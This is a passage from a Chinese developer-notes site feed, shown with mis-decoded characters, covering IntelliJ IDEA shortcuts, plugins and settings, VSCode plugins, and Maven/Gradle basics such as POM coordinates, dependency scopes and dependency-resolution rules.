<li>Ctrl+Shift+U     å¯¹é€‰ä¸­ä»£ç è¿›è¡Œå¤§å°å†™è½¬æ¢</li>
</ul>
<p>æ–‡ä»¶æ“ä½œ</p>
<ul>
<li>Ctrl+F     å½“å‰æ–‡ä»¶æŸ¥æ‰¾</li>
<li>Ctrl+Shift+F     å…¨å±€æ–‡ä»¶æŸ¥æ‰¾</li>
<li>Ctrl+R     å½“å‰æ–‡ä»¶æ›¿æ¢</li>
<li>Ctrl+Shift+R     å…¨å±€æ–‡ä»¶æ›¿æ¢</li>
</ul>
<p>è°ƒè¯•</p>
<ul>
<li>F8     å•æ­¥è°ƒè¯•</li>
<li>F9     è·³åˆ°ä¸‹ä¸€æ–­ç‚¹æˆ–ç»“æŸè°ƒè¯•</li>
<li>F7     å•æ­¥è¿›å…¥</li>
<li>Shift+F8     å•æ­¥è·³å‡º</li>
</ul>
<p>æ³¨é‡Š
Ctrl+/     æ³¨é‡Š/å–æ¶ˆæ³¨é‡Šå½“å‰è¡Œ
Ctrl+Shift+/     æ³¨é‡Š/å–æ¶ˆæ³¨é‡Š(å¤šè¡Œï¼Œæ³¨é‡Šæ—¶é€‰ä¸­è¦æ³¨é‡Šçš„ä»£ç ï¼Œå–æ¶ˆæ³¨é‡Šæ—¶ï¼Œå…‰æ ‡åœ¨æ³¨é‡Šå†…ä»»æ„ä½ç½®å³å¯)</p>
<p>Alt+Enter     é”™è¯¯ä¿®å¤è§£å†³æ–¹æ¡ˆ</p>
<p>æ–‡ä»¶åˆ‡æ¢</p>
<ul>
<li>
<p>Alt+ä¸Šé”®     å°†å…‰æ ‡ç§»åˆ°ä¸Šä¸€ä¸ªæ–¹æ³•åæˆ–ç±»å</p>
</li>
<li>
<p>Alt+ä¸‹é”®     å°†å…‰æ ‡ç§»åˆ°ä¸‹ä¸€ä¸ªæ–¹æ³•åæˆ–æ–‡ä»¶ç»“å°¾</p>
</li>
<li>
<p>Alt+å·¦é”®     åˆ‡æ¢åˆ°å‰ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶(æ‰“å¼€å¤šä¸ªæ–‡ä»¶æ—¶åˆ‡æ¢æ–‡ä»¶)</p>
</li>
<li>
<p>Alt+å³é”®     åˆ‡æ¢åˆ°å‰ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶(æ‰“å¼€å¤šä¸ªæ–‡ä»¶æ—¶åˆ‡æ¢æ–‡ä»¶)</p>
</li>
<li>
<p>Ctrl+U     å…‰æ ‡åœ¨æ–¹æ³•åæˆ–æ–¹æ³•å†…ï¼Œæ‰“å¼€é‡å†™ã€å®ç°çš„çˆ¶ç±»æ–¹æ³•ã€æ¥å£</p>
</li>
<li>
<p>Ctrl+Alt+B     å…‰æ ‡åœ¨æ–¹æ³•åä¸Š,æ‰“å¼€æ–¹æ³•å®ç°æˆ–é‡å†™</p>
</li>
<li>
<p>Ctrl+H     æŸ¥çœ‹é€‰æ‹©ç±»çš„ç»§æ‰¿å±‚æ¬¡ç»“æ„</p>
</li>
<li></li>
</ul>
<h2 id="å¸¸ç”¨æ’ä»¶" tabindex="-1"> å¸¸ç”¨æ’ä»¶</h2>
<ul>
<li>Alibaba Java Coding Guidelines</li>
<li>Free Mybatis plugin</li>
<li>Git ToolBox</li>
<li>JSON Parser</li>
<li>Key Promoter</li>
<li>leetcode editor</li>
<li>Lombok</li>
<li>MapStruct Support</li>
<li>Maven Helper</li>
<li>PlantUML</li>
<li>Rainbow Brackets</li>
<li>RestfulTookit</li>
<li>CodeGlance</li>
</ul>
<h1 id="é—®é¢˜åŠé…ç½®" tabindex="-1"> é—®é¢˜åŠé…ç½®</h1>
<h2 id="é»˜è®¤é…ç½®" tabindex="-1"> é»˜è®¤é…ç½®</h2>
<h3 id="file-other-settings-preferences-for-new-projects" tabindex="-1"> File--&gt;Other Settings--&gt;Preferences for New Projects</h3>
<h4 id="maven-é…ç½®" tabindex="-1"> Maven é…ç½®</h4>
<ul>
<li>ç‰ˆæœ¬</li>
<li>settings</li>
<li>repository</li>
</ul>
<h3 id="file-other-settings-structure-for-new-projects" tabindex="-1"> File--&gt;Other Settings--&gt;Structure for New Projects</h3>
<h2 id="å¸¸è§é…ç½®" tabindex="-1"> å¸¸è§é…ç½®</h2>
<h3 id="è‡ªåŠ¨å¯¼å…¥å¼•ç”¨ç±»æ‰€åœ¨åŒ…é…ç½®" tabindex="-1"> è‡ªåŠ¨å¯¼å…¥å¼•ç”¨ç±»æ‰€åœ¨åŒ…é…ç½®</h3>
<p>Editor -&gt; General -&gt; Auto Import</p>
<h3 id="å†…å­˜ä½¿ç”¨é‡å±•ç¤º" tabindex="-1"> å†…å­˜ä½¿ç”¨é‡å±•ç¤º</h3>
<p>Apperance -&gt; Window Options -&gt; Show Memory indicator</p>
<h3 id="æ‚¬æµ®æç¤º" tabindex="-1"> æ‚¬æµ®æç¤º</h3>
<p>Editor -&gt; General -&gt; show quick documention</p>
<h3 id="ctrl-é¼ æ ‡æ»šè½´ä¿®æ”¹å­—ä½“å¤§å°" tabindex="-1"> Ctrl+é¼ æ ‡æ»šè½´ä¿®æ”¹å­—ä½“å¤§å°</h3>
<p>Editor -&gt; General -&gt; change font size (zoom)</p>
<h3 id="æ˜¾ç¤ºå¤šè¡Œtab" tabindex="-1"> æ˜¾ç¤ºå¤šè¡ŒTab</h3>
<p>Editor -&gt; General -&gt; Editor Tabs</p>
<ol>
<li>show tabs in one row å–æ¶ˆå‹¾é€‰</li>
<li>tab limit</li>
</ol>
<h3 id="æ˜¾ç¤ºè¡Œå·å’Œæ–¹æ³•åˆ†éš”ç¬¦" tabindex="-1"> æ˜¾ç¤ºè¡Œå·å’Œæ–¹æ³•åˆ†éš”ç¬¦</h3>
<p>Editor -&gt; General -&gt; Appearance -&gt; show line numbers / show method separators</p>
<h3 id="æ–‡æ¡£æ³¨é‡Š" tabindex="-1"> æ–‡æ¡£æ³¨é‡Š</h3>
<p>Editor -&gt; File and Code Templates -&gt; includes -&gt; File Header</p>
<h3 id="æ–‡ä»¶æ¨¡æ¿é…ç½®" tabindex="-1"> æ–‡ä»¶æ¨¡æ¿é…ç½®</h3>
<p>Editor -&gt; File and Code Templates -&gt; File</p>
<p>Classçš„Java Docæ–‡ä»¶æ³¨é‡Š</p>
<div><pre><code>#<span>if</span> <span>(</span>$<span>{</span>PACKAGE_NAME<span>}</span> <span>&amp;&amp;</span> $<span>{</span>PACKAGE_NAME<span>}</span> <span>!=</span> <span>""</span><span>)</span><span>package</span> $<span>{</span>PACKAGE_NAME<span>}</span><span>;</span>#end
#<span>parse</span><span>(</span><span>"File Header.java"</span><span>)</span>
<span>/**
 * <span>@description</span>ï¼šTODO
 * <span>@author</span>     ï¼šchenwei.tjw
 * <span>@date</span>       ï¼š$<span>{</span>DATE<span>}</span> $<span>{</span>TIME<span>}</span>
 */</span>
<span>public</span> <span>class</span> $<span>{</span>NAME<span>}</span> <span>{</span>
<span>}</span>
</code></pre></div><h3 id="æ³¨é‡Šæ ¼å¼" tabindex="-1"> æ³¨é‡Šæ ¼å¼</h3>
<p>Editor -&gt; Code Style -&gt; Java -&gt; Code Generation -&gt; å–æ¶ˆå‹¾é€‰Line comment at first column</p>
<h3 id="leetcode-æ’ä»¶é…ç½®" tabindex="-1"> leetcode æ’ä»¶é…ç½®</h3>
<p>LeetCode editor é…ç½®</p>
<p>CodeFileName:</p>
<div><pre><code><span>P</span>$<span>!</span><span>{</span>question<span>.</span>frontendQuestionId<span>}</span>$<span>!</span>velocityTool<span>.</span><span>camelCaseName</span><span>(</span>$<span>{</span>question<span>.</span>titleSlug<span>}</span><span>)</span>
</code></pre></div><p>Codetemplate:</p>
<div><pre><code>$<span>{</span>question<span>.</span>content<span>}</span>

<span>//Javaï¼š${question.title}</span>

<span>package</span> <span>com<span>.</span>vika<span>.</span>autumn<span>.</span>leetcode<span>.</span>editor<span>.</span>cn</span><span>;</span>

<span>public</span> <span>class</span> <span>P</span>$<span>{</span>question<span>.</span>frontendQuestionId<span>}</span>$<span>!</span>velocityTool<span>.</span><span>camelCaseName</span><span>(</span>$<span>{</span>question<span>.</span>titleSlug<span>}</span><span>)</span><span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Solution</span> solution <span>=</span> <span>new</span> <span>P</span>$<span>!</span><span>{</span>question<span>.</span>frontendQuestionId<span>}</span>$<span>!</span>velocityTool<span>.</span><span>camelCaseName</span><span>(</span>$<span>{</span>question<span>.</span>titleSlug<span>}</span><span>)</span><span>(</span><span>)</span><span>.</span><span>new</span> <span>Solution</span><span>(</span><span>)</span><span>;</span>
        <span>// TO TEST</span>
    <span>}</span>
    $<span>{</span>question<span>.</span>code<span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="å¸¸è§é—®é¢˜" tabindex="-1"> å¸¸è§é—®é¢˜</h2>
<h3 id="ç¼–è¯‘å™¨è¯­è¨€ç‰ˆæœ¬" tabindex="-1"> ç¼–è¯‘å™¨è¯­è¨€ç‰ˆæœ¬</h3>
<ul>
<li>Build -&gt; Compiler -&gt; Java Compiler</li>
<li>Project Structure</li>
</ul>
<h3 id="mapstruct-æ³¨è§£ä¸è¯†åˆ«" tabindex="-1"> MapStruct æ³¨è§£ä¸è¯†åˆ«</h3>
<p>Build -&gt; Compiler -&gt; Annotation Processors</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">å·¥å…·</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">å¼€å‘æ•ˆç‡</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/VSCode.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/VSCode.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[

<h1 id="å¼€å‘æ•ˆç‡" tabindex="-1"> å¼€å‘æ•ˆç‡</h1>
<h2 id="å¸¸ç”¨æ’ä»¶" tabindex="-1"> å¸¸ç”¨æ’ä»¶</h2>
<ul>
<li>Auto Close Tag</li>
<li>Auto Rename Tag</li>
<li>Chinese Language</li>
<li>Color Highlight</li>
<li>Color Picker</li>
<li>ESLint</li>
<li>Java Test Runner</li>
<li>Live Server</li>
<li>Markdown All in One</li>
<li>Maven for Java</li>
<li>Paste Image</li>
<li>Settings Sync</li>
<li>vscode-icons</li>
</ul>
<h2 id="å¸¸ç”¨é…ç½®" tabindex="-1"> å¸¸ç”¨é…ç½®</h2>
<h3 id="paste-image-é…ç½®" tabindex="-1"> Paste Image é…ç½®</h3>
<ul>
<li>æ–‡ä»¶åå‰ç¼€ï¼šPaste Image: Name Prefix</li>
<li>æ–‡ä»¶å­˜å‚¨åœ°å€ï¼šPaste Image: Path</li>
</ul>
<div><pre><code>{
    "pasteImage.namePrefix": "mk-",
    "pasteImage.path": "${projectRoot}/assets/cs-note/distribute"
}
</code></pre></div>]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ã€æ„å»ºå·¥å…·çš„ä½œç”¨</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="ä¸€ã€æ„å»ºå·¥å…·çš„ä½œç”¨" tabindex="-1"> ä¸€ã€æ„å»ºå·¥å…·çš„ä½œç”¨</h1>
<p>æ„å»ºå·¥å…·æ˜¯ç”¨äºæ„å»ºé¡¹ç›®çš„è‡ªåŠ¨åŒ–å·¥å…·ï¼Œä¸»è¦åŒ…å«ä»¥ä¸‹å·¥ä½œï¼š</p>
<h2 id="ä¾èµ–ç®¡ç†" tabindex="-1"> ä¾èµ–ç®¡ç†</h2>
<p>ä¸å†éœ€è¦æ‰‹åŠ¨å¯¼å…¥ Jar ä¾èµ–åŒ…ï¼Œå¹¶ä¸”å¯ä»¥è‡ªåŠ¨å¤„ç†ä¾èµ–å…³ç³»ï¼Œä¹Ÿå°±æ˜¯è¯´æŸä¸ªä¾èµ–å¦‚æœä¾èµ–äºå…¶å®ƒä¾èµ–ï¼Œæ„å»ºå·¥å…·å¯ä»¥å¸®åŠ©æˆ‘ä»¬è‡ªåŠ¨å¤„ç†è¿™ç§ä¾èµ–å…³ç³»ã€‚</p>
<h2 id="è¿è¡Œå•å…ƒæµ‹è¯•" tabindex="-1"> è¿è¡Œå•å…ƒæµ‹è¯•</h2>
<p>ä¸å†éœ€è¦åœ¨é¡¹ç›®ä»£ç ä¸­æ·»åŠ æµ‹è¯•ä»£ç ï¼Œä»è€Œé¿å…äº†æ±¡æŸ“é¡¹ç›®ä»£ç ã€‚</p>
<h2 id="å°†æºä»£ç è½¬åŒ–ä¸ºå¯æ‰§è¡Œæ–‡ä»¶" tabindex="-1"> å°†æºä»£ç è½¬åŒ–ä¸ºå¯æ‰§è¡Œæ–‡ä»¶</h2>
<p>åŒ…å«é¢„å¤„ç†ã€ç¼–è¯‘ã€æ±‡ç¼–ã€é“¾æ¥ç­‰æ­¥éª¤ã€‚</p>
<h2 id="å°†å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œæ‰“åŒ…" tabindex="-1"> å°†å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œæ‰“åŒ…</h2>
<p>ä¸å†éœ€è¦ä½¿ç”¨ IDE å°†åº”ç”¨ç¨‹åºæ‰“åŒ…æˆ Jar åŒ…ã€‚</p>
<h2 id="å‘å¸ƒåˆ°ç”Ÿäº§æœåŠ¡å™¨ä¸Š" tabindex="-1"> å‘å¸ƒåˆ°ç”Ÿäº§æœåŠ¡å™¨ä¸Š</h2>
<p>ä¸å†éœ€è¦é€šè¿‡ FTP å°† Jar åŒ…ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šã€‚</p>
<h1 id="äºŒã€java-ä¸»æµæ„å»ºå·¥å…·" tabindex="-1"> äºŒã€Java ä¸»æµæ„å»ºå·¥å…·</h1>
<p>Ant å…·æœ‰ç¼–è¯‘ã€æµ‹è¯•å’Œæ‰“åŒ…åŠŸèƒ½ï¼Œå…¶åå‡ºç°çš„ Maven åœ¨ Ant çš„åŠŸèƒ½åŸºç¡€ä¸Šåˆæ–°å¢äº†ä¾èµ–ç®¡ç†åŠŸèƒ½ï¼Œè€Œæœ€æ–°çš„ Gradle åˆåœ¨ Maven çš„åŠŸèƒ½åŸºç¡€ä¸Šæ–°å¢äº†å¯¹ Groovy è¯­è¨€çš„æ”¯æŒã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/34751bd9-e8e4-4c20-94bc-f7217049fada.png" width="450px"> </div><br>
<p>Gradle å’Œ Maven çš„åŒºåˆ«æ˜¯ï¼Œå®ƒä½¿ç”¨ Groovy è¿™ç§ç‰¹å®šé¢†åŸŸè¯­è¨€ï¼ˆDSLï¼‰æ¥ç®¡ç†æ„å»ºè„šæœ¬ï¼Œè€Œä¸å†ä½¿ç”¨ XML è¿™ç§æ ‡è®°æ€§è¯­è¨€ã€‚å› ä¸ºé¡¹ç›®å¦‚æœåºå¤§çš„è¯ï¼ŒXML å¾ˆå®¹æ˜“å°±å˜å¾—è‡ƒè‚¿ã€‚</p>
<p>ä¾‹å¦‚è¦åœ¨é¡¹ç›®ä¸­å¼•å…¥ Junitï¼ŒMaven çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<div><pre><code><span>&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span><span><span>&lt;</span>project</span> <span>xmlns</span><span><span>=</span><span>"</span>http://maven.apache.org/POM/4.0.0<span>"</span></span> <span><span>xmlns:</span>xsi</span><span><span>=</span><span>"</span>http://www.w3.org/2001/XMLSchema-instance<span>"</span></span>
  <span><span>xsi:</span>schemaLocation</span><span><span>=</span><span>"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span>"</span></span><span>></span></span>
   <span><span><span>&lt;</span>modelVersion</span><span>></span></span>4.0.0<span><span><span>&lt;/</span>modelVersion</span><span>></span></span>
 
   <span><span><span>&lt;</span>groupId</span><span>></span></span>jizg.study.maven.hello<span><span><span>&lt;/</span>groupId</span><span>></span></span>
   <span><span><span>&lt;</span>artifactId</span><span>></span></span>hello-first<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
   <span><span><span>&lt;</span>version</span><span>></span></span>0.0.1-SNAPSHOT<span><span><span>&lt;/</span>version</span><span>></span></span>

   <span><span><span>&lt;</span>dependencies</span><span>></span></span>
          <span><span><span>&lt;</span>dependency</span><span>></span></span>
               <span><span><span>&lt;</span>groupId</span><span>></span></span>junit<span><span><span>&lt;/</span>groupId</span><span>></span></span>
               <span><span><span>&lt;</span>artifactId</span><span>></span></span>junit<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
               <span><span><span>&lt;</span>version</span><span>></span></span>4.10<span><span><span>&lt;/</span>version</span><span>></span></span>
               <span><span><span>&lt;</span>scope</span><span>></span></span>test<span><span><span>&lt;/</span>scope</span><span>></span></span>
          <span><span><span>&lt;/</span>dependency</span><span>></span></span>
   <span><span><span>&lt;/</span>dependencies</span><span>></span></span>
<span><span><span>&lt;/</span>project</span><span>></span></span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><p>è€Œ Gradle åªéœ€è¦å‡ è¡Œä»£ç ï¼š</p>
<div><pre><code>dependencies <span>{</span>
    testCompile <span>"junit:junit:4.10"</span>
<span>}</span>
</code></pre></div><h1 id="ä¸‰ã€maven" tabindex="-1"> ä¸‰ã€Maven</h1>
<h2 id="æ¦‚è¿°" tabindex="-1"> æ¦‚è¿°</h2>
<p>æä¾›äº†é¡¹ç›®å¯¹è±¡æ¨¡å‹ï¼ˆPOMï¼‰æ–‡ä»¶æ¥ç®¡ç†é¡¹ç›®çš„æ„å»ºã€‚</p>
<h2 id="ä»“åº“" tabindex="-1"> ä»“åº“</h2>
<p>ä»“åº“çš„æœç´¢é¡ºåºä¸ºï¼šæœ¬åœ°ä»“åº“ã€ä¸­å¤®ä»“åº“ã€è¿œç¨‹ä»“åº“ã€‚</p>
<ul>
<li>æœ¬åœ°ä»“åº“ç”¨æ¥å­˜å‚¨é¡¹ç›®çš„ä¾èµ–åº“ï¼›</li>
<li>ä¸­å¤®ä»“åº“æ˜¯ä¸‹è½½ä¾èµ–åº“çš„é»˜è®¤ä½ç½®ï¼›</li>
<li>è¿œç¨‹ä»“åº“ï¼Œå› ä¸ºå¹¶éæ‰€æœ‰çš„ä¾èµ–åº“éƒ½åœ¨ä¸­å¤®ä»“åº“ï¼Œæˆ–è€…ä¸­å¤®ä»“åº“è®¿é—®é€Ÿåº¦å¾ˆæ…¢ï¼Œè¿œç¨‹ä»“åº“æ˜¯ä¸­å¤®ä»“åº“çš„è¡¥å……ã€‚</li>
</ul>
<h2 id="pom" tabindex="-1"> POM</h2>
<p>POM ä»£è¡¨é¡¹ç›®å¯¹è±¡æ¨¡å‹ï¼Œå®ƒæ˜¯ä¸€ä¸ª XML æ–‡ä»¶ï¼Œä¿å­˜åœ¨é¡¹ç›®æ ¹ç›®å½•çš„ pom.xml æ–‡ä»¶ä¸­ã€‚</p>
<div><pre><code><span><span><span>&lt;</span>dependency</span><span>></span></span>
    <span><span><span>&lt;</span>groupId</span><span>></span></span>junit<span><span><span>&lt;/</span>groupId</span><span>></span></span>
    <span><span><span>&lt;</span>artifactId</span><span>></span></span>junit<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
    <span><span><span>&lt;</span>version</span><span>></span></span>4.12<span><span><span>&lt;/</span>version</span><span>></span></span>
    <span><span><span>&lt;</span>scope</span><span>></span></span>test<span><span><span>&lt;/</span>scope</span><span>></span></span>
<span><span><span>&lt;/</span>dependency</span><span>></span></span>
</code></pre></div><p>[groupId, artifactId, version, packaging, classifier] ç§°ä¸ºä¸€ä¸ªé¡¹ç›®çš„åæ ‡ï¼Œå…¶ä¸­ groupIdã€artifactIdã€version å¿…é¡»å®šä¹‰ï¼Œpackaging å¯é€‰ï¼ˆé»˜è®¤ä¸º Jarï¼‰ï¼Œclassifier ä¸èƒ½ç›´æ¥å®šä¹‰çš„ï¼Œéœ€è¦ç»“åˆæ’ä»¶ä½¿ç”¨ã€‚</p>
<ul>
<li>groupIdï¼šé¡¹ç›®ç»„ Idï¼Œå¿…é¡»å…¨çƒå”¯ä¸€ï¼›</li>
<li>artifactIdï¼šé¡¹ç›® Idï¼Œå³é¡¹ç›®åï¼›</li>
<li>versionï¼šé¡¹ç›®ç‰ˆæœ¬ï¼›</li>
<li>packagingï¼šé¡¹ç›®æ‰“åŒ…æ–¹å¼ã€‚</li>
</ul>
<h2 id="maven-scope" tabindex="-1"> Maven Scope</h2>
<p>scopeå®šä¹‰äº†ç±»åŒ…åœ¨é¡¹ç›®çš„ä½¿ç”¨é˜¶æ®µã€‚é¡¹ç›®é˜¶æ®µåŒ…æ‹¬ï¼š ç¼–è¯‘ï¼Œè¿è¡Œï¼Œæµ‹è¯•å’Œå‘å¸ƒã€‚</p>
<ul>
<li>
<p>compileï¼šé»˜è®¤scopeä¸ºcompileï¼Œè¡¨ç¤ºä¸ºå½“å‰ä¾èµ–å‚ä¸é¡¹ç›®çš„ç¼–è¯‘ã€æµ‹è¯•å’Œè¿è¡Œé˜¶æ®µï¼Œå±äºå¼ºä¾èµ–ã€‚æ‰“åŒ…ä¹‹æ—¶ï¼Œä¼šè¾¾åˆ°åŒ…é‡Œå»ã€‚</p>
</li>
<li>
<p>testï¼šè¯¥ä¾èµ–ä»…ä»…å‚ä¸æµ‹è¯•ç›¸å…³çš„å†…å®¹ï¼ŒåŒ…æ‹¬æµ‹è¯•ç”¨ä¾‹çš„ç¼–è¯‘å’Œæ‰§è¡Œï¼Œæ¯”å¦‚å®šæ€§çš„Junitã€‚</p>
</li>
<li>
<p>runtimeï¼šä¾èµ–ä»…å‚ä¸è¿è¡Œå‘¨æœŸä¸­çš„ä½¿ç”¨ã€‚ä¸€èˆ¬è¿™ç§ç±»åº“éƒ½æ˜¯æ¥å£ä¸å®ç°ç›¸åˆ†ç¦»çš„ç±»åº“ï¼Œæ¯”å¦‚JDBCç±»åº“ï¼Œåœ¨ç¼–è¯‘ä¹‹æ—¶ä»…ä¾èµ–ç›¸å…³çš„æ¥å£ï¼Œåœ¨å…·ä½“çš„è¿è¡Œä¹‹æ—¶ï¼Œæ‰éœ€è¦å…·ä½“çš„mysqlã€oracleç­‰ç­‰æ•°æ®çš„é©±åŠ¨ç¨‹åºã€‚æ­¤ç±»çš„é©±åŠ¨éƒ½æ˜¯ä¸ºruntimeçš„ç±»åº“ã€‚</p>
</li>
<li>
<p>providedï¼šè¯¥ä¾èµ–åœ¨æ‰“åŒ…è¿‡ç¨‹ä¸­ï¼Œä¸éœ€è¦æ‰“è¿›å»ï¼Œè¿™ä¸ªç”±è¿è¡Œçš„ç¯å¢ƒæ¥æä¾›ï¼Œæ¯”å¦‚tomcatæˆ–è€…åŸºç¡€ç±»åº“ç­‰ç­‰ï¼Œäº‹å®ä¸Šï¼Œè¯¥ä¾èµ–å¯ä»¥å‚ä¸ç¼–è¯‘ã€æµ‹è¯•å’Œè¿è¡Œç­‰å‘¨æœŸï¼Œä¸compileç­‰åŒã€‚åŒºåˆ«åœ¨äºæ‰“åŒ…é˜¶æ®µè¿›è¡Œäº†excludeæ“ä½œã€‚</p>
</li>
<li>
<p>systemï¼šä½¿ç”¨ä¸Šä¸providedç›¸åŒï¼Œä¸åŒä¹‹å¤„åœ¨äºè¯¥ä¾èµ–ä¸ä»mavenä»“åº“ä¸­æå–ï¼Œè€Œæ˜¯ä»æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­æå–ï¼Œå…¶ä¼šå‚ç…§systemPathçš„å±æ€§è¿›è¡Œæå–ä¾èµ–ã€‚</p>
</li>
<li>
<p>importï¼šè¿™ä¸ªæ˜¯maven2.0.9ç‰ˆæœ¬åå‡ºçš„å±æ€§ï¼Œimportåªèƒ½åœ¨dependencyManagementçš„ä¸­ä½¿ç”¨ï¼Œèƒ½è§£å†³mavenå•ç»§æ‰¿é—®é¢˜ï¼Œimportä¾èµ–å…³ç³»å®é™…ä¸Šå¹¶ä¸å‚ä¸é™åˆ¶ä¾èµ–å…³ç³»çš„ä¼ é€’æ€§ã€‚</p>
</li>
</ul>
<h2 id="ä¾èµ–åŸåˆ™" tabindex="-1"> ä¾èµ–åŸåˆ™</h2>
<h3 id="dependencymanagementä¸dependenciesæœ‰ä½•åŒºåˆ«" tabindex="-1"> dependencyManagementä¸dependenciesæœ‰ä½•åŒºåˆ«ï¼Ÿ</h3>
<p>dependencyManagementå¸¸ç”¨äºçˆ¶POMå¯¹äºå­æ¨¡å—çš„ä¾èµ–ç®¡ç†ï¼Œæ‰€ä»¥ä¸€èˆ¬åªç”¨äºçˆ¶POMæ–‡ä»¶ï¼›
a. ä¸»è¦ç”¨ä»¥ç»Ÿä¸€ç®¡ç†å„ä¸ªä¾èµ–çš„ç‰ˆæœ¬å·ï¼Œé¿å…åŒä¸€ä¸ªé¡¹ç›®å¯¹äºåŒä¸€ä¸ªä¾èµ–å‡ºç°ä¸åŒç‰ˆæœ¬å¯¼è‡´ä¸€äº›ç‰ˆæœ¬ä¸å…¼å®¹ä¹‹ç±»çš„é—®é¢˜
b. ç”¨äºå£°æ˜ä¾èµ–ï¼ˆå­æ¨¡å—ä¾èµ–çˆ¶POMçš„å¼•ç”¨ï¼‰ï¼Œå°†æ‰€æœ‰çš„å¤–éƒ¨åŒ…ç»Ÿä¸€åˆ°çˆ¶POMæ–‡ä»¶ï¼Œä»¥ä¾¿äºç®¡ç†ç»´æŠ¤</p>
<h3 id="_1-ä¾èµ–è·¯å¾„æœ€çŸ­ä¼˜å…ˆåŸåˆ™" tabindex="-1"> 1. ä¾èµ–è·¯å¾„æœ€çŸ­ä¼˜å…ˆåŸåˆ™</h3>
<div><pre><code>A -> B -> C -> X(1.0)
A -> D -> X(2.0)
</code></pre></div><p>ç”±äº X(2.0) è·¯å¾„æœ€çŸ­ï¼Œæ‰€ä»¥ä½¿ç”¨ X(2.0)ã€‚</p>
<h3 id="_2-å£°æ˜é¡ºåºä¼˜å…ˆåŸåˆ™" tabindex="-1"> 2. å£°æ˜é¡ºåºä¼˜å…ˆåŸåˆ™</h3>
<div><pre><code>A -> B -> X(1.0)
A -> C -> X(2.0)
</code></pre></div><p>åœ¨ POM ä¸­æœ€å…ˆå£°æ˜çš„ä¼˜å…ˆï¼Œä¸Šé¢çš„ä¸¤ä¸ªä¾èµ–å¦‚æœå…ˆå£°æ˜ Bï¼Œé‚£ä¹ˆæœ€åä½¿ç”¨ X(1.0)ã€‚</p>
<h3 id="_3-è¦†å†™ä¼˜å…ˆåŸåˆ™" tabindex="-1"> 3. è¦†å†™ä¼˜å…ˆåŸåˆ™</h3>
<p>å­ POM å†…å£°æ˜çš„ä¾èµ–ä¼˜å…ˆäºçˆ¶ POM ä¸­å£°æ˜çš„ä¾èµ–ã€‚</p>
<h3 id="_4-ä¼ é€’ä¾èµ–" tabindex="-1"> 4. ä¼ é€’ä¾èµ–</h3>
<p>ç¬¬ä¸€åˆ—è¡¨ç¤ºç›´æ¥ä¾èµ–çš„scopeï¼Œç¬¬ä¸€è¡Œè¡¨ç¤ºé—´æ¥ä¾èµ–çš„scope
<img src="@source/assets/cs-note/distribute/mk-2020-07-12-14-27-35.png" alt="" loading="lazy"></p>
<h2 id="è§£å†³ä¾èµ–å†²çª" tabindex="-1"> è§£å†³ä¾èµ–å†²çª</h2>
<p>æ‰¾åˆ° Maven åŠ è½½çš„ Jar åŒ…ç‰ˆæœ¬ï¼Œä½¿ç”¨ <code>mvn dependency:tree</code> æŸ¥çœ‹ä¾èµ–æ ‘ï¼Œæ ¹æ®ä¾èµ–åŸåˆ™æ¥è°ƒæ•´ä¾èµ–åœ¨ POM æ–‡ä»¶çš„å£°æ˜é¡ºåºã€‚</p>
<h2 id="å¸¸è§mavenå‘½å®š" tabindex="-1"> å¸¸è§Mavenå‘½å®š</h2>
<ul>
